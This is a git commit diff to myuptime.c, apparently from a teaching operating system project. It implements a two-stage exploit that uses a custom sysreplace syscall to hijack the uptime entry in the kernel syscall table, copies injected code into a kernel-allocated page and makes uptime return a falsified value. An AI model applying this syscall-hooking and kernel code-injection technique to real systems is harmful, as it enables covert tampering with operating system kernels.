d69fd93c92a831aa51eb8862487c6a8c5d3a29bc
Josh Matthews <jmatthews@twilio.com>
2014-09-27 13:42:28 -0400

    Finishing myuptime that executes from the kernel
    - Removing now unused code from myuptime.c and renaming some variables.
    
    - The second stage of the exploit now successfully calls the original
      sys_uptime from inside the kernel.

--- myuptime.c
+++ myuptime.c
@@ -2,49 +2,51 @@
 #include "stat.h"
 #include "user.h"
 
-int (*x)(void);
-
-void dummy()
-{
-    return;
-}
+int (*oldUptime)(void);
 
 int exploitStage2() {
-    return 2;
+    int eip = 0;
+    int (*realUptime)(void);
+
+    // Grab our eip from eax
+    asm("mov %%eax, %0" : "=r" (eip));
+    realUptime = (int(*)(void)) (*(int*)(eip - sizeof(int)));
+    return realUptime() + 50000;
 }
 
 void* exploitStage1() {
-    char *(*kalloc)(void);
-    char *newpage;
-    /* int oldcall; */
+    int *(*kalloc)(void);
+    int *newpage;
 
-    kalloc = (char*(*)())findkalloc();
-    newpage =kalloc();
+    kalloc = (int*(*)())findkalloc();
+    newpage = kalloc();
+    *newpage = (int)oldUptime;
 
-    memmove(newpage, &exploitStage2, 1024);
+    memmove(&newpage[1], &exploitStage2, 1024);
     /* sysreplace(14, (uint)newpage, (uint)&oldcall); */
 
-    return newpage;
-}
-
-int myuptime(void)
-{
-  int u = x();
-  return u + 50000;
+    return &newpage[1];
 }
 
 int main()
 {
   int u;
-  x = 0;
+  oldUptime = 0;
 
+  // Call the real uptime
   u = uptime();
   printf(1, "%d\n", u);
 
-  sysreplace(14, (uint) &exploitStage1, (uint) &x);
-  u = uptime();
-  sysreplace(14, (uint) u, (uint) &x);
+  // replace with exploit stage 1
+  sysreplace(14, (uint) &exploitStage1, (uint) &oldUptime);
 
+  // call exploit stage 1, kalloc and copy in stage 2
+  u = uptime();
+
+  // replace stage 1 with stage 2 in syscall table
+  sysreplace(14, (uint) u, (uint) &oldUptime);
+
+  // verify success
   u = uptime();
   printf(1, "%d\n", u);
 
